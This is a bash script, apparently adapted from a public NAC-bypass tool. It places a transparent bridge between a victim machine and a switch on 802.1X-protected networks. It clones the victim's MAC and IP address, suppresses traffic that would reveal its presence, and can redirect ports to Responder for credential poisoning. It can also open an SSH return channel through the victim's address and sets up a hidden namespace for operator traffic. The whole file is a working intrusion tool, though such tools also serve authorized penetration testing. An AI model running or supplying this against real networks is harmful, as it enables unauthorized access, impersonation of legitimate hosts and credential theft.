#!/bin/bash
if [[ $EUID -ne 0 ]]; then
  echo "[!] This script must be run as root."
  exit 1
fi

# -----------------------------------------------------------------------------
# Based on: https://github.com/scipag/nac_bypass
# Adjustments to the original script:
#   - Fine-tuned connection messages to indicate cable order and reduce
#     unknown MAC alerts when connecting client and switch.
#   - Creation of an isolated "bypass" namespace with dedicated macvlan after fase_conexion,
#     isolating operator traffic.
#   - Extended cleanup routine to remove namespace, macvlan and auxiliary files,
#     facilitating repeated executions without residue.
# -----------------------------------------------------------------------------

# --- Configuration variables --------------------------------------------
VERSION="0.6.5-1715949302"

CMD_TABLAS_ARP=/usr/sbin/arptables
CMD_TABLAS_EB=/usr/sbin/ebtables
CMD_TABLAS_IP=/usr/sbin/iptables

# Color palette for readable terminal messages.
COLOR_REINICIO="\e[0m" # reset text
COLOR_EXITO="\e[1;32m" # green
COLOR_INFO="\e[1;34m" # blue
COLOR_ALERTA="\e[1;31m" # red
COLOR_INDICACION="\e[1;36m" # cyan

INTERFAZ_PUENTE=br0 # bridge interface
INTERFAZ_SWITCH=eth0 # network interface connected to switch
MAC_SWITCH=00:11:22:33:44:55 # initial value, set during initialization
INTERFAZ_CLIENTE=eth1 # network interface connected to victim machine

IP_PUENTE=169.254.66.66 # IP address for bridge
PUERTA_ENLACE_PUENTE=169.254.66.1 # gateway IP address for bridge

ARCHIVO_CAPTURA=/tmp/tcpdump.pcap
OPCION_RESPONDER=0        # Activates port redirection for Responder
OPCION_SSH=0              # Enables redirection and OpenSSH startup
OPCION_AUTONOMA=0         # Suppresses manual interaction and extra messages
OPCION_SOLO_CONEXION=0    # Executes only the second bypass phase
OPCION_SOLO_INICIAL=0     # Executes only the initial phase
OPCION_REINICIO=0         # Resets environment and exits

# Ports of interest analyzed during initial capture.
PUERTO_TCPDUMP_1=88
PUERTO_TCPDUMP_2=445

# Ports Responder typically needs for poisoning and authentication.
PUERTO_UDP_NETBIOS_NS=137
PUERTO_UDP_NETBIOS_DS=138
PUERTO_UDP_DNS=53
PUERTO_UDP_LDAP=389
PUERTO_TCP_LDAP=389
PUERTO_TCP_SQL=1433
PUERTO_UDP_SQL=1434
PUERTO_TCP_HTTP=80
PUERTO_TCP_HTTPS=443
PUERTO_TCP_SMB=445
PUERTO_TCP_NETBIOS_SS=139
PUERTO_TCP_FTP=21
PUERTO_TCP_SMTP1=25
PUERTO_TCP_SMTP2=587
PUERTO_TCP_POP3=110
PUERTO_TCP_IMAP=143
PUERTO_TCP_PROXY=3128
PUERTO_UDP_MULTIDIFUSION=5553

PUERTO_RETORNO_SSH=50222 # SSH return port uses victimip:50022 to connect attackerbox:sshport
PUERTO_SSH=50022
RANGO_PUERTOS_NAT=61000-62000 # ports for my traffic in NAT

# --- Utility functions --------------------------------------------------
mostrar_ayuda() {
  echo -e "$0 v$VERSION usage:"
  echo "    -1 <eth>    network interface connected to switch"
  echo "    -2 <eth>    network interface connected to victim machine"
  echo "    -a          autonomous mode"
  echo "    -c          start only connection configuration"
  echo "    -g <MAC>    manually set gateway MAC address (MAC_PUERTA_ENLACE)"
  echo "    -h          shows this help"
  echo "    -i          start only initial configuration"
  echo "    -r          reset all settings"
  echo "    -R          enable port redirection for Responder"
  echo "    -S          enable port redirection for OpenSSH and start service"
  exit 0
}

## show version information
mostrar_version() {
  echo -e "$0 v$VERSION"
  exit 0
}

# Analyzes received parameters and adjusts execution flags.
analizar_argumentos() {
  while getopts ":1:2:acg:hirRS" option; do
    case "$option" in
      1)
        INTERFAZ_SWITCH=$OPTARG
        ;;
      2)
        INTERFAZ_CLIENTE=$OPTARG
        ;;
      a)
        OPCION_AUTONOMA=1
        ;;
      c)
        OPCION_SOLO_CONEXION=1
        ;;
      g)
        MAC_PUERTA_ENLACE=$OPTARG
        ;;
      h)
        mostrar_ayuda
        ;;
      i)
        OPCION_SOLO_INICIAL=1
        ;;
      r)
        OPCION_REINICIO=1
        ;;
      R)
        OPCION_RESPONDER=1
        ;;
      S)
        OPCION_SSH=1
        ;;
      *)
        OPCION_RESPONDER=0
        OPCION_SSH=0
        OPCION_AUTONOMA=0
        ;;
    esac
  done
}

# --- Phase 1: Prepare bridge infrastructure -------------------------
fase_inicial() {
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Starting NAC bypass procedure.$COLOR_REINICIO"
    echo
  fi

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Executing preparation tasks.$COLOR_REINICIO"
    echo
  fi

  systemctl stop NetworkManager.service
  cp /etc/sysctl.conf /etc/sysctl.conf.bak
  echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
  sysctl -p
  echo "" > /etc/resolv.conf

  # Disable multicast on both interfaces so network doesn't receive initial IGMP.
  ip link set "$INTERFAZ_SWITCH" multicast off
  ip link set "$INTERFAZ_CLIENTE" multicast off

  # Pause common NTP services; any automatic synchronization can reveal presence.
  declare -a SERVICIOS_NTP=("ntp.service" "ntpsec.service" "chronyd.service" "systemd-timesyncd.service")
  for SERVICIO in "${SERVICIOS_NTP[@]}"; do
    ESTADO_SERVICIO=$(systemctl is-active "$SERVICIO")
    if [[ $ESTADO_SERVICIO == "active" ]]; then
      systemctl stop "$SERVICIO"
    fi
  done
  timedatectl set-ntp false

  # Automatically get physical MAC address of port towards switch.
  MAC_SWITCH=$(ifconfig "$INTERFAZ_SWITCH" | grep -i ether | awk '{ print $2 }')

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Preparation completed.$COLOR_REINICIO"
    echo
  fi

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Configuring main bridge.$COLOR_REINICIO"
    echo
  fi

  brctl addbr "$INTERFAZ_PUENTE"                              # create virtual bridge
  brctl addif "$INTERFAZ_PUENTE" "$INTERFAZ_CLIENTE"          # add client interface
  brctl addif "$INTERFAZ_PUENTE" "$INTERFAZ_SWITCH"          # add interface towards switch

  echo 8 > "/sys/class/net/${INTERFAZ_PUENTE}/bridge/group_fwd_mask"            # forward EAP frames for 802.1X
  echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables

  ifconfig "$INTERFAZ_CLIENTE" 0.0.0.0 up promisc              # bring up client interface in promiscuous mode
  ifconfig "$INTERFAZ_SWITCH" 0.0.0.0 up promisc              # bring up switch interface in promiscuous mode

  macchanger -m 00:12:34:56:78:90 "$INTERFAZ_PUENTE"          # initial neutral value
  macchanger -m "$MAC_SWITCH" "$INTERFAZ_PUENTE"              # spoof MAC from switch side

  ifconfig "$INTERFAZ_PUENTE" 0.0.0.0 up promisc

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Bridge initialized in passive mode.$COLOR_REINICIO"
    echo
    echo -e "$COLOR_INDICACION [ # ] Recommended order: connect $INTERFAZ_CLIENTE to client and then $INTERFAZ_SWITCH to switch.$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Check link and LED activity on both interfaces before continuing.$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Wait ~30 seconds for link negotiation and press any key to proceed.$COLOR_REINICIO"
    echo -e "$COLOR_ALERTA [ ! ] Confirm target machine maintains connectivity before advancing.$COLOR_REINICIO"
    echo -e "$COLOR_INFO [ * ] Monitoring EAPOL frames on $INTERFAZ_CLIENTE to validate authentication.$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Press any key to stop monitoring and continue.$COLOR_REINICIO"

    local PID_MONITOREO_EAPOL=""
    local TCPDUMP_MONITOREO_ARGS=(-i "$INTERFAZ_CLIENTE" -l -nn -e -vvv -s0 -tttt ether proto 0x888e)
    trap '[[ -n "$PID_MONITOREO_EAPOL" ]] && kill -INT "$PID_MONITOREO_EAPOL" 2>/dev/null' INT TERM
    tcpdump "${TCPDUMP_MONITOREO_ARGS[@]}" &
    PID_MONITOREO_EAPOL=$!

    read -r -s -n1
    echo
    if kill -0 "$PID_MONITOREO_EAPOL" 2>/dev/null; then
      kill -INT "$PID_MONITOREO_EAPOL" 2>/dev/null
      wait "$PID_MONITOREO_EAPOL" 2>/dev/null
    fi
    trap - INT TERM
  else
    sleep 25s
  fi
}

# --- Phase 2: Clone identity ----------------------
fase_conexion() {

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Resetting links on $INTERFAZ_CLIENTE and $INTERFAZ_SWITCH.$COLOR_REINICIO"
    echo -e "$COLOR_INFO [ * ] Restarting interfaces to force renegotiation in promiscuous mode.$COLOR_REINICIO"
    echo
  fi

  for IFACE in "$INTERFAZ_CLIENTE" "$INTERFAZ_SWITCH"; do
    if ip link set "$IFACE" down 2>/dev/null; then
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_INDICACION [ # ] $IFACE has been successfully deactivated.$COLOR_REINICIO"
    else
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_ALERTA [ ! ] Could not deactivate $IFACE.$COLOR_REINICIO"
    fi
  done

  sleep 1

  for IFACE in "$INTERFAZ_CLIENTE" "$INTERFAZ_SWITCH"; do
    if ip link set "$IFACE" up 2>/dev/null; then
      ip link set "$IFACE" promisc on 2>/dev/null
      local ESTADO_IFACE
      ESTADO_IFACE=$(cat "/sys/class/net/${IFACE}/operstate" 2>/dev/null)
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_EXITO [ + ] $IFACE active (status: ${ESTADO_IFACE:-unknown}).$COLOR_REINICIO"
    else
      [[ "$OPCION_AUTONOMA" -eq 0 ]] && echo -e "$COLOR_ALERTA [ ! ] Could not activate $IFACE.$COLOR_REINICIO"
    fi
  done

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
  fi

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Capturing initial TCP traffic.$COLOR_REINICIO"
    echo
  fi

  ## Capture PCAP and look for SYN packets from victim machine to get source IP, source MAC and gateway MAC
  # TODO: Replace this with tcp SYN OR (udp && no broadcast)? need to distinguish source and destination
  # TODO: Replace it by getting data directly from source interface?
  tcpdump -i "$INTERFAZ_CLIENTE" -s0 -w "$ARCHIVO_CAPTURA" -c1 'tcp[13] & 2 != 0'

  MAC_CLIENTE=$(tcpdump -r "$ARCHIVO_CAPTURA" -nne -c 1 tcp | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}')
  if [[ -z "$MAC_PUERTA_ENLACE" ]]; then
    MAC_PUERTA_ENLACE=$(tcpdump -r "$ARCHIVO_CAPTURA" -nne -c 1 tcp | awk '{print $2","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $2}')
  fi
  IP_CLIENTE=$(tcpdump -r "$ARCHIVO_CAPTURA" -nne -c 1 tcp | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}')
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Processing capture and updating parameters.$COLOR_REINICIO"
    echo -e "$COLOR_INFO [ * ] MAC_CLIENTE: $MAC_CLIENTE | MAC_PUERTA_ENLACE: $MAC_PUERTA_ENLACE | IP_CLIENTE: $IP_CLIENTE $COLOR_REINICIO"
    echo
  fi

  ## go silent
  $CMD_TABLAS_ARP -A OUTPUT -o "$INTERFAZ_SWITCH" -j DROP
  $CMD_TABLAS_ARP -A OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -A OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -A OUTPUT -o "$INTERFAZ_SWITCH" -j DROP

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Applying bridge IP, L2 translation and default route.$COLOR_REINICIO"
    echo
  fi
  ifconfig "$INTERFAZ_PUENTE" "$IP_PUENTE" up promisc

  ## configure Layer 2 rewriting
  ## If script was called with -c, we need to find MAC of interface towards switch.
  if [[ "$OPCION_SOLO_CONEXION" -eq 1 ]]; then
    MAC_SWITCH=$(ifconfig "$INTERFAZ_SWITCH" | grep -i ether | awk '{ print $2 }')
  fi
  $CMD_TABLAS_EB -t nat -A POSTROUTING -s "$MAC_SWITCH" -o "$INTERFAZ_SWITCH" -j snat --to-src "$MAC_CLIENTE"
  $CMD_TABLAS_EB -t nat -A POSTROUTING -s "$MAC_SWITCH" -o "$INTERFAZ_PUENTE" -j snat --to-src "$MAC_CLIENTE"

  ## create default routes to route traffic: all traffic goes to bridge gateway and is sent at Layer 2 to MAC_PUERTA_ENLACE
  arp -s -i "$INTERFAZ_PUENTE" "$PUERTA_ENLACE_PUENTE" "$MAC_PUERTA_ENLACE"
  route add default gw "$PUERTA_ENLACE_PUENTE" dev "$INTERFAZ_PUENTE" metric 10

  ## --- Flag-controlled redirection rules ---

  # SSH redirection (-S)
  if [[ "$OPCION_SSH" -eq 1 ]]; then
    if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
      echo
      echo -e "$COLOR_INFO [ * ] Enabling incoming SSH redirection on $IP_CLIENTE:$PUERTO_RETORNO_SSH and starting OpenSSH.$COLOR_REINICIO"
      echo
    fi
    $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" \
      -p tcp --dport "$PUERTO_RETORNO_SSH" -j DNAT --to "$IP_PUENTE:$PUERTO_SSH"

    systemctl start ssh.service 2>/dev/null || true
  fi

  # Responder redirection (-R)
  if [[ "$OPCION_RESPONDER" -eq 1 ]]; then
    if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
      echo
      echo -e "$COLOR_INFO [ * ] Enabling port redirection for Responder.$COLOR_REINICIO"
      echo
    fi

    PUERTOS_RESPONDER_UDP=($PUERTO_UDP_NETBIOS_NS $PUERTO_UDP_NETBIOS_DS $PUERTO_UDP_DNS \
                           $PUERTO_UDP_LDAP $PUERTO_UDP_SQL $PUERTO_UDP_MULTIDIFUSION)
    PUERTOS_RESPONDER_TCP=($PUERTO_TCP_LDAP $PUERTO_TCP_SQL $PUERTO_TCP_HTTP $PUERTO_TCP_HTTPS \
                           $PUERTO_TCP_SMB $PUERTO_TCP_NETBIOS_SS $PUERTO_TCP_FTP \
                           $PUERTO_TCP_SMTP1 $PUERTO_TCP_SMTP2 $PUERTO_TCP_POP3 \
                           $PUERTO_TCP_IMAP $PUERTO_TCP_PROXY)

    for p in "${PUERTOS_RESPONDER_UDP[@]}"; do
      $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" \
        -p udp --dport "$p" -j DNAT --to "$IP_PUENTE:$p"
    done
    for p in "${PUERTOS_RESPONDER_TCP[@]}"; do
      $CMD_TABLAS_IP -t nat -A PREROUTING -i "$INTERFAZ_PUENTE" -d "$IP_CLIENTE" \
        -p tcp --dport "$p" -j DNAT --to "$IP_PUENTE:$p"
    done
  fi

  ## --- Controlled outgoing NAT ---
  # Only translate traffic originating from IP_PUENTE (namespace), not entire host.
  $CMD_TABLAS_IP -t nat -A POSTROUTING -o "$INTERFAZ_PUENTE" -s "$IP_PUENTE" \
    -p tcp -j SNAT --to "$IP_CLIENTE:$RANGO_PUERTOS_NAT"
  $CMD_TABLAS_IP -t nat -A POSTROUTING -o "$INTERFAZ_PUENTE" -s "$IP_PUENTE" \
    -p udp -j SNAT --to "$IP_CLIENTE:$RANGO_PUERTOS_NAT"
  $CMD_TABLAS_IP -t nat -A POSTROUTING -o "$INTERFAZ_PUENTE" -s "$IP_PUENTE" \
    -p icmp -j SNAT --to "$IP_CLIENTE"

  ## START SSH
  if [[ "$OPCION_SSH" -eq 1 ]]; then
    systemctl start ssh.service
  fi

  ## Finish
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Configuration finished. Validate connectivity and services before operating.$COLOR_REINICIO"
    echo
  fi

  ## Restore traffic flow; monitor ports for blocking
  $CMD_TABLAS_ARP -D OUTPUT -o "$INTERFAZ_SWITCH" -j DROP
  $CMD_TABLAS_ARP -D OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -D OUTPUT -o "$INTERFAZ_CLIENTE" -j DROP
  $CMD_TABLAS_IP -D OUTPUT -o "$INTERFAZ_SWITCH" -j DROP

  ## Cleanup
  rm "$ARCHIVO_CAPTURA"

  ## Create isolated namespace and macvlan for operator
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Building isolated namespace \"bypass\" for controlled operations.$COLOR_REINICIO"
    echo
  fi

  local NS_NOMBRE="bypass"
  local NS_INTERFAZ="mv0"
  local NS_DIR="/etc/netns/${NS_NOMBRE}"
  local NS_CLEANUP_CMD="ip netns delete ${NS_NOMBRE}"
  local NS_RECURSOS_OK=1
  local NS_CMD_FALTAN=()
  local NS_IP_CIDR=""
  local NS_GATEWAY="$PUERTA_ENLACE_PUENTE"

  local NS_COMANDOS=("ip" "brctl" "macchanger" "tcpdump" "ebtables" "iptables")
  for CMD_NS in "${NS_COMANDOS[@]}"; do
    if ! command -v "$CMD_NS" >/dev/null 2>&1; then
      NS_CMD_FALTAN+=("$CMD_NS")
    fi
  done
  if ! ip netns list >/dev/null 2>&1; then
    NS_CMD_FALTAN+=("ip netns")
  fi

  if [[ ${#NS_CMD_FALTAN[@]} -gt 0 ]]; then
    echo -e "$COLOR_ALERTA [ ! ] Missing dependencies for namespace (${NS_CMD_FALTAN[*]}). Creation skipped, continuing with main flow.$COLOR_REINICIO"
    NS_RECURSOS_OK=0
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    if ! ip link show "$INTERFAZ_PUENTE" >/dev/null 2>&1; then
      echo -e "$COLOR_ALERTA [ ! ] $INTERFAZ_PUENTE not available; macvlan $NS_INTERFAZ will not be created.$COLOR_REINICIO"
      NS_RECURSOS_OK=0
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    ip netns list | grep -qw "$NS_NOMBRE" && ip netns delete "$NS_NOMBRE"
    ip link show "$NS_INTERFAZ" >/dev/null 2>&1 && ip link delete "$NS_INTERFAZ"

    if ! ip netns add "$NS_NOMBRE"; then
      echo -e "$COLOR_ALERTA [ ! ] Could not create namespace $NS_NOMBRE.$COLOR_REINICIO"
      NS_RECURSOS_OK=0
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    if ! ip link add "$NS_INTERFAZ" link "$INTERFAZ_PUENTE" type macvlan mode bridge 2>/dev/null; then
      echo -e "$COLOR_ALERTA [ ! ] Could not create macvlan $NS_INTERFAZ on $INTERFAZ_PUENTE.$COLOR_REINICIO"
      ip netns delete "$NS_NOMBRE" 2>/dev/null
      NS_RECURSOS_OK=0
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    if [[ -n "$MAC_CLIENTE" ]]; then
      ip link set "$NS_INTERFAZ" address "$MAC_CLIENTE" 2>/dev/null || echo -e "$COLOR_ALERTA [ ! ] Could not assign legitimate MAC to $NS_INTERFAZ.$COLOR_REINICIO"
    else
      echo -e "$COLOR_ALERTA [ ! ] MAC_CLIENTE not defined; $NS_INTERFAZ will use default MAC.$COLOR_REINICIO"
    fi
    ip link set "$NS_INTERFAZ" promisc on 2>/dev/null
    if ! ip link set "$NS_INTERFAZ" netns "$NS_NOMBRE" 2>/dev/null; then
      echo -e "$COLOR_ALERTA [ ! ] Could not move $NS_INTERFAZ to namespace $NS_NOMBRE.$COLOR_REINICIO"
      ip link delete "$NS_INTERFAZ" 2>/dev/null
      ip netns delete "$NS_NOMBRE" 2>/dev/null
      NS_RECURSOS_OK=0
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    if ! ip netns exec "$NS_NOMBRE" ip link set "$NS_INTERFAZ" up 2>/dev/null; then
      echo -e "$COLOR_ALERTA [ ! ] Could not activate $NS_INTERFAZ within namespace.$COLOR_REINICIO"
      NS_RECURSOS_OK=0
    fi
    if [[ -n "$IP_CLIENTE" ]]; then
      if [[ "$IP_CLIENTE" == */* ]]; then
        NS_IP_CIDR="$IP_CLIENTE"
      elif [[ -n "${IP_CLIENTE_PREFIJO:-}" ]]; then
        NS_IP_CIDR="${IP_CLIENTE}/${IP_CLIENTE_PREFIJO}"
      else
        NS_IP_CIDR="${IP_CLIENTE}/32"
      fi
      ip netns exec "$NS_NOMBRE" ip addr flush dev "$NS_INTERFAZ" scope global 2>/dev/null
      ip netns exec "$NS_NOMBRE" ip addr add "$NS_IP_CIDR" dev "$NS_INTERFAZ" 2>/dev/null || echo -e "$COLOR_ALERTA [ ! ] Could not assign client IP to $NS_INTERFAZ.$COLOR_REINICIO"
    else
      echo -e "$COLOR_ALERTA [ ! ] IP_CLIENTE not defined; namespace will lack its own addressing.$COLOR_REINICIO"
    fi

    if [[ -n "$NS_GATEWAY" ]]; then
      ip netns exec "$NS_NOMBRE" ip route replace "$NS_GATEWAY"/32 dev "$NS_INTERFAZ" scope link 2>/dev/null || true
      ip netns exec "$NS_NOMBRE" ip route replace default via "$NS_GATEWAY" dev "$NS_INTERFAZ" 2>/dev/null || echo -e "$COLOR_ALERTA [ ! ] Could not set default route within namespace.$COLOR_REINICIO"
      if [[ -n "$MAC_PUERTA_ENLACE" ]]; then
        ip netns exec "$NS_NOMBRE" arp -s "$NS_GATEWAY" "$MAC_PUERTA_ENLACE" dev "$NS_INTERFAZ" 2>/dev/null || true
      fi
    else
      echo -e "$COLOR_ALERTA [ ! ] PUERTA_ENLACE_PUENTE not defined; default route will not be configured in namespace.$COLOR_REINICIO"
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    if mkdir -p "$NS_DIR"; then
      echo "nameserver 8.8.8.8" > "$NS_DIR/resolv.conf"
    else
      echo -e "$COLOR_ALERTA [ ! ] Could not prepare /etc/netns for namespace.$COLOR_REINICIO"
    fi
  fi

  if [[ "$NS_RECURSOS_OK" -eq 1 ]]; then
    # Prevent leaks only on bridge interfaces, without blocking host global traffic
    ebtables -t filter -C OUTPUT -o "$INTERFAZ_PUENTE" -s "$MAC_SWITCH" -j DROP 2>/dev/null || \
      ebtables -t filter -A OUTPUT -o "$INTERFAZ_PUENTE" -s "$MAC_SWITCH" -j DROP

    ip netns exec "$NS_NOMBRE" ip -br addr show "$NS_INTERFAZ" 2>/dev/null || true
    echo -e "$COLOR_EXITO [ + ] Namespace \"$NS_NOMBRE\" available for operational use.$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Interactive access: sudo ip netns exec $NS_NOMBRE bash$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Command execution: sudo ip netns exec $NS_NOMBRE <command>$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Network verification: sudo ip netns exec $NS_NOMBRE ping -c1 <gateway_or_target>$COLOR_REINICIO"
    echo -e "$COLOR_INDICACION [ # ] Recommended cleanup: sudo $NS_CLEANUP_CMD$COLOR_REINICIO"
    echo -e "$COLOR_INFO [ * ] Use namespace exclusively for operational traffic.$COLOR_REINICIO"
  else
    echo -e "$COLOR_ALERTA [ ! ] Namespace not configured. Perform manual cleanup: sudo $NS_CLEANUP_CMD$COLOR_REINICIO"
  fi

  ## Ready
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INDICACION [ * ] Configuration ready. Continue with planned actions.$COLOR_REINICIO"
    echo
  fi
}

# --- Complete cleanup routine -------------------------------------------
restablecer_configuracion() {
  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_INFO [ * ] Starting complete restoration routine.$COLOR_REINICIO"
    echo
  fi

  ## bring down bridge
  ifconfig "$INTERFAZ_PUENTE" down
  brctl delbr "$INTERFAZ_PUENTE"

  ## remove default route
  arp -d -i "$INTERFAZ_PUENTE" "$PUERTA_ENLACE_PUENTE" "$MAC_PUERTA_ENLACE"
  route del default dev "$INTERFAZ_PUENTE"

  # Flush EB, ARP and IPTABLES
  $CMD_TABLAS_EB -F 2>/dev/null
  $CMD_TABLAS_EB -t nat -F 2>/dev/null
  $CMD_TABLAS_ARP -F 2>/dev/null
  $CMD_TABLAS_IP -F 2>/dev/null
  $CMD_TABLAS_IP -X 2>/dev/null
  $CMD_TABLAS_IP -t nat -F 2>/dev/null
  $CMD_TABLAS_IP -t nat -X 2>/dev/null

  # Restore sysctl.conf
  cp /etc/sysctl.conf.bak /etc/sysctl.conf
  rm /etc/sysctl.conf.bak
  sysctl -p

  if command -v ip >/dev/null 2>&1; then
    if ip netns list 2>/dev/null | grep -qw "bypass"; then
      ip netns delete bypass
    fi
    ip link delete mv0 2>/dev/null || true
  fi
  rm -rf /etc/netns/bypass 2>/dev/null || true

  if [[ "$OPCION_AUTONOMA" -eq 0 ]]; then
    echo
    echo -e "$COLOR_EXITO [ + ] Restoration finished. Environment returned to initial state.$COLOR_REINICIO"
    echo
  fi
}

# --- Entry point ------------------------------------------------------
analizar_argumentos "$@"

if [[ "$OPCION_REINICIO" -eq 0 && "$OPCION_SOLO_INICIAL" -eq 0 && "$OPCION_SOLO_CONEXION" -eq 0 ]]; then
  echo -e "$COLOR_INFO [ * ] Confirm switch cable is disconnected before continuing.$COLOR_REINICIO"
  read -r -p "[?] Press ENTER when switch connection is disconnected." _
fi

if [[ "$OPCION_REINICIO" -eq 1 ]]; then
  restablecer_configuracion
  exit 0
fi

if [[ "$OPCION_SOLO_INICIAL" -eq 1 ]]; then
  fase_inicial
  exit 0
fi

if [[ "$OPCION_SOLO_CONEXION" -eq 1 ]]; then
  fase_conexion
  exit 0
fi

fase_inicial
fase_conexion
